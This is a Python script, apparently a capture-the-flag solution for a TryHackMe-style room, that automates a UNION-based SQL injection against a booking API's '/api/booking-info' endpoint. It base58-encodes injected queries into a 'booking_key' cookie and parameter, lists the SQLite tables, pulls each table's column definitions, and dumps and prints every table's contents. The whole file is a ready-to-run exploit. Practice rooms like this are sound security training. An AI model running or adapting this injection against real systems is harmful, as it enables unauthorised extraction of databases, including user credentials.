#!/usr/bin/env python3

import argparse
import base58
import os
import platform
import re
import requests

class Brutus:
    def __init__(self, target):
        if not(isinstance(target,str)):
            raise TypeError(f"target must be string. got {type(target)}")

        target = target.strip()
        if len(target) < 1:
            raise ValueError("target cannot be an empty string")

        self.__session = requests.Session()
        self.__target = target
        self.__timeout = 5
        return

    def __dump_tables(self):
        content = str()
        cookie_key = "booking_key"
        message = str()
        success = bool()
        target = f"{self.__target}/api/booking-info"

        try:
            SysMsgNB("getting db tables ...")

            # https://stackoverflow.com/questions/82875/how-can-i-list-the-tables-in-a-sqlite-database-file-that-was-opened-with-attach
            booking_string = "booking_id:1' union SELECT group_concat(name,','),1 FROM sqlite_master WHERE type='table' --;"

            # https://pypi.org/project/base58/
            encoded_id = base58.b58encode(booking_string).decode("utf-8")

            params = {cookie_key: encoded_id}
            cookies = {cookie_key: encoded_id}

            resp = self.__session.get(target, cookies=cookies, params=params, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad return value ({resp.status_code} {resp.reason})")

            content = resp.json().get("room_num")

            message = "tables found"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (content, success, message)

    def __dump_columns(self, tablename):
        content = str()
        cookie_key = "booking_key"
        message = str()
        success = bool()
        target = f"{self.__target}/api/booking-info"

        try:
            SysMsgNB(f"getting columns for {tablename} ...")

            booking_string = f"booking_id:1' union SELECT sql,2 FROM sqlite_master where tbl_name = '{tablename}' AND type = 'table'--;"

            # https://pypi.org/project/base58/
            encoded_id = base58.b58encode(booking_string).decode("utf-8")

            params = {cookie_key: encoded_id}
            cookies = {cookie_key: encoded_id}

            resp = self.__session.get(target, cookies=cookies, params=params, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad return value ({resp.status_code} {resp.reason})")

            content = resp.json().get("room_num")

            message = "tables found"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (content, success, message)

    def __parse_columns(self, sqlstr):
        col_list = list()
        message = str()
        success = bool() 

        try:
            SysMsgNB("parsing columns ...")

            col_match, success, message = FindFlag(sqlstr, "\\(.*\\)")
            if not(success):
                raise ValueError(message)

            col_match_list = col_match.strip("(").strip(")").split(",")
            for current in col_match_list:
                current = current.strip()
                current = current.split(" ")[0]
                col_list.append(current)

            message = "columns parsed"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (col_list, success, message)

    def __display_table(self, tablename, columns):
        content = str()
        cookie_key = "booking_key"
        message = str()
        success = bool()
        target = f"{self.__target}/api/booking-info"

        try:
            booking_string = f"booking_id:1' union SELECT group_concat({columns[0]},','),group_concat({columns[1]}||'::'||{columns[2]},',') FROM {tablename}--;"

            # https://pypi.org/project/base58/
            encoded_id = base58.b58encode(booking_string).decode("utf-8")

            params = {cookie_key: encoded_id}
            cookies = {cookie_key: encoded_id}

            resp = self.__session.get(target, cookies=cookies, params=params, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad return value ({resp.status_code} {resp.reason})")

            content = resp.json()
            col1_vals = content.get("room_num").split(",")
            col23_vals = content.get("days").split(",")

            SucMsg(tablename)
            print("-"*60)
            print(f"{columns[0]:<19}|{columns[1]:<19}|{columns[2]}")
            print("-"*60)
            for i in range(len(col1_vals)):
                col23_split = col23_vals[i].split("::")
                col2_val = col23_split[0]
                col3_val = col23_split[1]

                print(f"{col1_vals[i]:<19}|{col2_val:<19}|{col3_val}")
            print("-"*60)

            message = "display successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def attack(self):
        try:
            content, success, message = self.__dump_tables()
            if not(success):
                raise ValueError(message)
            
            table_list = content.split(",")
            for table_name in table_list:
                content, success, message = self.__dump_columns(table_name)
                if not(success):
                    ErrMsg(f"{table_name}: {message}")
                    continue

                col_list, success, message = self.__parse_columns(content)
                if not(success):
                    ErrMsg(f"{table_name} COLUMN PARSE: {message}")
                    continue

                success, message = self.__display_table(table_name,col_list)
                if not(success):
                    ErrMsg(f"unable to display {table_name}")
                    continue

        except Exception as ex:
            ErrMsg(str(ex))
        return


############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    secure = args.secure

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}"

    try:
        brutus = Brutus(baseurl)
        brutus.attack()
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()

